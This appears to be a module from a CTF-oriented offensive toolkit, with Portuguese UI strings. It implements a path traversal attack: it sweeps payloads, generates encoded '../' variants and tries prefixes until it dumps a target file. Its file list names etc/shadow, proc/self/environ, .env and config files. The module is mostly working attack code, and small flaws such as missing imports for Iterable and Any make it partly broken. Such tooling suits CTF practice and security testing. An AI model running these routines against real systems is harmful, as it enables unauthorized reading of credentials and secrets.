"""modules/traversal.py"""

from __future__ import annotations

from rich.console import Console

from ctflab.core import http as H, payloads as P
from ctflab.core.session import Session
from ctflab.cli.menu import run_menu
from ctflab.cli.ui import ask, askctx, ask_int, show_response, scan_table

from ctflab.core.scanner import BaseScanner
from ctflab.core.models import ScanResult


class TraversalScanner(BaseScanner):
    """Scanner automatizado de Path Traversal."""
    name = "path_traversal"
    capabilities = ["http", "traversal", "detection"]

    def __init__(self, ctx, path: str = "/", param: str = "file"):
        super().__init__(ctx)
        self.path = path
        self.param = param
        self.payload_mgr = P.PayloadManager()

    def get_payloads(self) -> Iterable[str]:
        return self.payload_mgr.load("traversal")

    def execute(self, payload: str) -> Any:
        return H.get(self.ctx.session, self.path, params={self.param: payload})

    def analyze(self, payload: str, response: Any) -> ScanResult:
        # Detecta hit se retornar etc/passwd ou se o status for 200 com tamanho suspeito
        if "root:x:0:0" in response.text or (response.status_code == 200 and len(response.text) > 100):
            return ScanResult(
                success=True,
                confidence=0.9,
                details=f"Hit com payload: {payload}",
                severity="High"
            )
        return ScanResult(success=False, confidence=0.0, details="-")


# arquivos interessantes para tentar ler em cada traversal hit
_JUICY_FILES = [
    "etc/passwd",
    "etc/shadow",
    "etc/hostname",
    "proc/self/environ",
    "proc/self/cmdline",
    "proc/version",
    "flag",
    "flag.txt",
    "secret.txt",
    "app/config.py",
    "app/.env",
    ".env",
    "config.json",
    "private/flag.txt",
]


def _auto_scan(s: Session, c: Console) -> None:
    path  = askctx(s, "path",        "path",        "/")
    param = askctx(s, "query_param", "query param", "")

    pl    = P.load("traversal")
    table = scan_table(
        f"Path Traversal — {len(pl)} payloads",
        ["payload", "status", "tamanho", "resposta"],
    )

    hits = 0
    with H.make_client(s) as cl:
        for p in pl:
            try:
                r       = cl.get(path, params={param: p} if param else {})
                code    = r.status_code
                size    = len(r.content)
                snippet = r.text[:60]
                style   = "ok" if code == 200 else "fail"

                if code == 200:
                    hits += 1
                    s.note(f"traversal hit: {p} → {snippet[:40]}")
            except Exception as exc:
                code, size, style, snippet = 0, 0, "fail", str(exc)[:60]

            table.add_row(
                p[:45],
                f"[{style}]{code}[/{style}]",
                str(size),
                snippet,
            )

    c.print(table)
    if hits:
        c.print(f"\n[ok]{hits} payload(s) com sucesso![/ok]")
        c.print("[dim]use 'dump de arquivo' para ler conteúdo completo[/dim]")
    else:
        c.print("\n[fail]nenhum hit[/fail]")


def _manual(s: Session, c: Console) -> None:
    path  = askctx(s, "path",        "path",        "/")
    param = askctx(s, "query_param", "query param", "")
    value = ask("valor do param")
    r = H.get(s, path, {param: value} if param else {})
    show_response(r, s.history[-1].elapsed, s)


def _generate_variants(s: Session, c: Console) -> None:
    target = ask("arquivo alvo (ex: flag.txt)")
    depth  = ask_int("profundidade máxima", 5)

    variants: set[str] = set()
    prefixes = ["../", "..%2f", "%2e%2e/", "....//", "..%252f"]
    folders  = ["", "public/", "uploads/", "static/", "files/", "images/"]

    for d in range(1, depth + 1):
        for sep in prefixes:
            for folder in folders:
                variants.add(f"{folder}{sep * d}{target}")

    c.print(f"\n[info]{len(variants)} variações:[/info]")
    for v in sorted(variants):
        c.print(f"  [dim]{v}[/dim]")


def _dump_file(s: Session, c: Console) -> None:
    """
    Dump direto de arquivo — tenta prefixos progressivos até conseguir ler.

    Exibe o conteúdo completo quando o traversal funciona.
    """
    path  = askctx(s, "path",        "path",        "/")
    param = askctx(s, "query_param", "query param", "file")

    c.print("\n[dim]arquivos comuns para tentar:[/dim]")
    for i, f in enumerate(_JUICY_FILES, 1):
        c.print(f"  [dim]{i:2d}. {f}[/dim]")

    target = ask("arquivo alvo (ex: etc/passwd ou flag.txt)", "etc/passwd")

    prefixes = [
        "../",
        "../../",
        "../../../",
        "../../../../",
        "../../../../../",
        "..%2f",
        "../../%2f",
        "%2e%2e/",
        "....//",
        "%2e%2e%2f",
        "%2e%2e%2f%2e%2e%2f",
    ]

    c.print(f"\n[warn]tentando {len(prefixes)} prefixos para '{target}'...[/warn]")

    with H.make_client(s) as cl:
        for prefix in prefixes:
            value = f"{prefix}{target}"
            try:
                r = cl.get(path, params={param: value})
                if r.status_code == 200 and len(r.text) > 10:
                    c.print(f"\n[ok]HIT com: {value!r}[/ok]")
                    c.print(f"\n[info]conteúdo:[/info]")
                    c.print(r.text[:2000])
                    s.note(f"traversal dump: {value} → {len(r.text)} bytes")
                    return
            except Exception:
                continue

    c.print("[fail]nenhum prefixo funcionou[/fail]")


_OPTIONS = {
    "1": ("varredura automática",         _auto_scan),
    "2": ("payload manual",               _manual),
    "3": ("gerar variações para arquivo", _generate_variants),
    "4": ("dump de arquivo (auto-prefix)", _dump_file),
    "0": ("voltar",                       None),
}


def run(session: Session, console: Console) -> None:
    run_menu("PATH TRAVERSAL", _OPTIONS, session, console)
